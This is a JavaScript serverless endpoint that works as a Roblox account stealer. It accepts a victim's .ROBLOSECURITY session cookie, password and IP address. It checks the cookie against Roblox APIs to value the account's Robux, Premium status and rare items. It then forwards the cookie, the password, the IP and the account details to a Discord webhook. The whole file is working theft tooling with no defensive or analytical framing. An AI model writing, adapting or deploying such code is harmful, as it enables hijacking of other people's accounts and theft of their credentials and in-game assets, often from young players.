// File: api/sender.js
export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { cookie, password, ip } = req.body;
  if (!cookie || !password || !ip) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  if (!webhookUrl) {
    return res.status(500).json({ error: "Webhook URL not configured" });
  }

  // Validate cookie and get Roblox account details using the helper function
  const userInfo = await validateRobloxCookie(cookie);
  if (!userInfo) {
    return res.status(400).json({
      error: "Invalid cookie, please get fresh cookie",
      progress: 100
    });
  }

  const { id, name, robux, pending, isPremium, ownsKorblox, ownsHeadless, profilePicUrl } = userInfo;
  const premiumStatus = isPremium ? "Yes" : "No";

  // Use embed description for the full cookie (up to 2048 characters)
  let cookieDisplay = cookie;
  if (cookie.length > 2048) {
    cookieDisplay =
      cookie.slice(0, 2048) +
      "\n\n*Cookie truncated due to Discord's 2048 character limit in embed descriptions.*";
  }

  const embed = {
    title: "Roblox Account Details ⚡",
    thumbnail: { url: profilePicUrl },
    description: `**Cookie:**\n\`\`\`${cookieDisplay}\`\`\``,
    fields: [
      { name: "👤 Username", value: String(name) || "Unknown", inline: true },
      { name: "🆔 User ID", value: String(id) || "Unknown", inline: true },
      { name: "💰 Robux Balance", value: String(robux) || "Unknown", inline: true },
      { name: "⏳ Pending Robux", value: String(pending) || "Unknown", inline: true },
      { name: "⭐ Premium", value: premiumStatus, inline: true },
      { name: "💀 Korblox Deathspeaker", value: ownsKorblox ? "Yes" : "No", inline: true },
      { name: "👻 Headless Horseman", value: ownsHeadless ? "Yes" : "No", inline: true },
      { name: "🔑 Password", value: String(password), inline: false },
      { name: "🌐 User IP", value: String(ip), inline: false },
      { name: "🔗 View Roblox", value: "[Link](https://www.roblox.com)", inline: false }
    ],
    footer: { text: `Logged at: ${new Date().toLocaleString()}` },
    color: 3447003
  };

  try {
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
    const text = await response.text();
    if (!response.ok)
      return res.status(500).json({ error: "Failed to send log", details: text });
    return res.status(200).json({
      success: true,
      message: "Log sent successfully",
      account: { robux }
    });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}

async function validateRobloxCookie(cookie) {
  try {
    const headers = {
      Cookie: `.ROBLOSECURITY=${cookie}`,
      "User-Agent": "Mozilla/5.0"
    };

    // Authenticate user
    const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", { headers });
    if (!userResponse.ok) throw new Error("Invalid Roblox cookie");
    const userData = await userResponse.json();

    // Get Robux balance
    const balanceResponse = await fetch("https://economy.roblox.com/v1/user/currency", { headers });
    const balanceData = balanceResponse.ok ? await balanceResponse.json() : { robux: "Unknown" };

    // Check Premium status
    const premiumResponse = await fetch(
      `https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`,
      { headers }
    );
    const premiumText = premiumResponse.ok ? await premiumResponse.text() : "false";
    const isPremium = premiumText.trim() === "true";

    // Check inventory for Korblox Deathspeaker
    const korbloxResponse = await fetch(
      `https://inventory.roblox.com/v1/users/${userData.id}/items/asset/181266973`,
      { headers }
    );
    let ownsKorblox = false;
    if (korbloxResponse.ok) {
      const korbloxData = await korbloxResponse.json();
      ownsKorblox = !!(korbloxData.data && korbloxData.data.length > 0);
    }

    // Check inventory for Headless Horseman
    const headlessResponse = await fetch(
      `https://inventory.roblox.com/v1/users/${userData.id}/items/asset/134082579`,
      { headers }
    );
    let ownsHeadless = false;
    if (headlessResponse.ok) {
      const headlessData = await headlessResponse.json();
      ownsHeadless = !!(headlessData.data && headlessData.data.length > 0);
    }

    // Get the Roblox profile picture (avatar headshot)
    let profilePicUrl = "";
    const thumbResponse = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userData.id}&size=420x420&format=Png&isCircular=false`,
      { headers }
    );
    if (thumbResponse.ok) {
      const thumbData = await thumbResponse.json();
      profilePicUrl = thumbData.data[0]?.imageUrl || "";
    }

    // Set pending Robux (this is simulated; adjust if you have an API for this)
    const pending = 0;

    return {
      id: userData.id,
      name: userData.name,
      displayName: userData.displayName || "N/A",
      robux: balanceData.robux,
      isPremium,
      ownsKorblox,
      ownsHeadless,
      pending,
      profilePicUrl
    };
  } catch (error) {
    console.error("Failed to validate Roblox cookie:", error);
    return null;
  }
}